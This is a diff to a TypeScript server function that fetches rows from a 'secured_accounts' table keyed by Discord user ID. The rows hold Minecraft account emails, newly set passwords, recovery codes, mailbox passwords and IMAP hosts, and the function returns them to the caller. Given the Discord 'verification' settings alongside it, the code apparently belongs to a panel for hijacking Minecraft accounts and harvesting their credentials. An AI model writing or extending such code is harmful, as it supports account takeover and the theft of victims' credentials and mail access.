@@ -668,13 +668,32 @@ export const getVerificationSettings = createServerFn({ method: "GET" }).handler
 export const getSecuredAccounts = createServerFn({ method: "GET" }).handler(async () => {
   const { requireUser, admin } = await import("./luaux-server.server");
   const user = await requireUser();
-  const { data } = await admin()
+  const { data, error } = await admin()
     .from("secured_accounts")
-    .select("*")
+    .select(
+      "id, discord_id, mc_username, mc_email, new_email, new_password, new_recovery_code, mailbox_email, mailbox_password, mailbox_provider, mailbox_imap_host, mc_method, mc_capes, secured_at, guild_id, session_id",
+    )
     .eq("discord_id", user.id)
     .order("secured_at", { ascending: false })
-    .limit(20);
-  return data ?? [];
+    .limit(50);
+  if (error) {
+    // Older schema without mailbox_* columns
+    const { data: fallback } = await admin()
+      .from("secured_accounts")
+      .select("*")
+      .eq("discord_id", user.id)
+      .order("secured_at", { ascending: false })
+      .limit(50);
+    return (fallback ?? []).map((row) => ({
+      ...row,
+      mailbox_email: (row as { mailbox_email?: string }).mailbox_email || (row as { new_email?: string }).new_email || null,
+      mailbox_password: (row as { mailbox_password?: string }).mailbox_password || null,
+    }));
+  }
+  return (data ?? []).map((row) => ({
+    ...row,
+    mailbox_email: row.mailbox_email || row.new_email || null,
+  }));
 });
 
 export const saveVerificationSettings = createServerFn({ method: "POST" })
